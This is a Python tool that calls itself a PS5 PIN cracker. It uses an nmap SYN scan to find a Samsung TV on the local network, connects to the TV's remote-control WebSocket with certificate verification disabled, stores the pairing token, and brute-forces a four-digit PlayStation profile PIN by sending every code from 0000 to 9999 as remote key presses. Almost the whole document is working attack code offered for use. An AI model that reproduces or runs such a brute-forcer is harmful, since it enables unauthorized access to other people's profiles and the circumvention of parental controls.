# PS5 PIN CRACKER!!!

import base64
import json
import time
import socket
import nmap
import ipaddress
import ssl
from websocket import create_connection

class SamsungTV:
    def __init__(self, host, port=8002, name="ps_remote", token=None):
        """
        Initialize the connection to the Samsung TV via WebSocket.
        - `host`: TV IP address.
        - `port`: TV port (default 8002).
        - `name`: Name of the remote control.
        - `token`: Authentication token (if None, it will be fetched from the TV).
        """
        try:
            # Form the WebSocket URI with base64 encoded remote name and optional token
            uri = f"wss://{host}:{port}/api/v2/channels/samsung.remote.control?name={base64.b64encode(name.encode('utf-8')).decode('utf-8')}"
            uri += f"&token={token}"

            # Create the WebSocket connection (ignores SSL verification)
            self.connection = create_connection(uri, sslopt={"cert_reqs": ssl.CERT_NONE})

            # If token is not provided, fetch it from the TV response
            if token is None:
                response = json.loads(self.connection.recv())
                token = response["data"]["token"]

                if response['event'] != 'ms.channel.connect':
                    self.close()
                    raise Exception(f"Unexpected event: {response['event']}")

                # Save token to a file for future use
                try:
                    with open("token.txt", "w") as token_file:
                        token_file.write(token)
                except:
                    print("Unable to create a file!")

            self.token = token
        except:
            print("Unable to connect! Make sure of the TV IP and port.")

    def close(self):
        """Close the WebSocket connection."""
        if self.connection:
            self.connection.close()
            self.connection = None

    def send_key(self, key):
        """
        Send a key press to the TV.
        - `key`: The key to press (e.g., 'KEY_1', 'KEY_ENTER').
        """
        payload = json.dumps({
            'method': 'ms.remote.control',
            'params': {'Cmd': 'Click', 'DataOfCmd': key, 'Option': 'false', 'TypeOfRemote': 'SendRemoteKey'}
        })
        self.connection.send(payload)
        time.sleep(0.2)

    def crack(self, start=0, end=10000):
        """
        Attempt to brute force the PIN by sending key presses.
        - `start`: The starting PIN value.
        - `end`: The ending PIN value.
        """
        if (start >= 0 and start < 10000) and end <= 10000:
            for i in range(start, end):
                num = f"{i:04d}"
                # Send each digit of the PIN
                self.send_key(f"KEY_{num[0]}")
                self.send_key(f"KEY_{num[1]}")
                self.send_key(f"KEY_{num[2]}")
                self.send_key(f"KEY_{num[3]}")
                time.sleep(0.3)
                self.send_key("KEY_ENTER")
                print(num)
        else:
            print("PIN range is: 0-10000")

def scan():
    """
    Scan the local network to find the TV by checking port 8002.
    Returns the IP address of the TV if found.
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    deviceIP = s.getsockname()[0]
    s.close()

    # Create an IPv4 network object for scanning
    networkIP = ipaddress.IPv4Network(f"{deviceIP}/24", strict=False)
    print(f"\nScanning network: {networkIP}\n")

    # Perform a port scan on the network
    try:
        nm = nmap.PortScanner()
        results = nm.scan(hosts=str(networkIP), arguments="-sS -p 8002")

        for host, data in results['scan'].items():
            port_state = data['tcp'][8002]['state']
            if port_state == 'open':
                return host  # Return the TV's IP address if port 8002 is open
        
        return "None"
    except Exception as e:
        print(e)
        print("Cannot scan the network, please try option number 1")

def main():
    token = ""
    tv = None
    ip = ""
    port = -2
    menu = """
    ▷ PIN BRUTEFORCER ▷
    =====================
    1- Enter your TV information
    2- Start brute-forcing
    3- Instruction page
    4- Attempt to automatically retrieve TV information!
    5- Specify password range
    6- To exit
    """
    print(menu)

    try:
        ch = int(input("Enter your option: "))
    except:
        print("Invalid option!")

    while ch != 6:
        # Main menu loop
        if ch == 1:
            token = ""
            ip = input("Please enter your TV IP: ")
            port = int(input("Enter the TV port (try 8002 as it is the default): "))

            # Try to read the token from the file
            try:
                with open("token.txt", "r") as token_file:
                    token = token_file.read()
            except:
                print("Click allow when prompted!")

            if len(token) == 0:
                tv = SamsungTV(ip, token=None, port=port)
            else:
                tv = SamsungTV(ip, token=token, port=port)

            tv.close()

        elif ch == 2:
            if tv != "": 
                tv = SamsungTV(ip, token=token, port=port)
                print("Please point and click on the profile you want to crack!")
                print("It will start in 5 seconds...\n")

                time.sleep(5)
                tv.crack()
            else:
                print("Provide the TV information first!")

        elif ch == 3:
            print("Visit: https://github.com/coderMohammed1/PS-5-PIN-cracker")

        elif ch == 4:
            ip = str(scan())    
            token = ""
            port = 8002
            
            if ip == "None":
                    print("Unable to find supported tv pleas try option 1!")
                    print()
                    
                    try:
                        ch = int(input("Enter your option: "))
                    except:
                        print("Invalid option!")    
                    continue
                
            # Try to read the token from the file
            try:
                with open("token.txt", "r") as token_file:
                    token = token_file.read()
            except:
                print("Click allow when prompted!")

            if len(token) == 0:
                tv = SamsungTV(ip, token=None, port=port)
            else:
                tv = SamsungTV(ip, token=token, port=port)

            tv.close()

        elif ch == 5:
            if tv != "": 
                print("Please point and click on the profile you want to crack!")
                start = int(input("Please specify where to start: "))
                end = int(input("Please specify where to stop: "))

                print("\nIt will start in 5 seconds...\n")
                time.sleep(5)

                tv = SamsungTV(ip, token=token, port=port)
                tv.crack(start, end)
                print("\n")
            else:
                print("Provide the TV information first!")

        else:
            print("Invalid option")

        print(menu)

        try:
            ch = int(input("Enter your option: "))
        except:
            print("Invalid option!")

    # Close the connection after the program ends
    try:
        tv.close()
    except:
        print("Closing...\n")

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
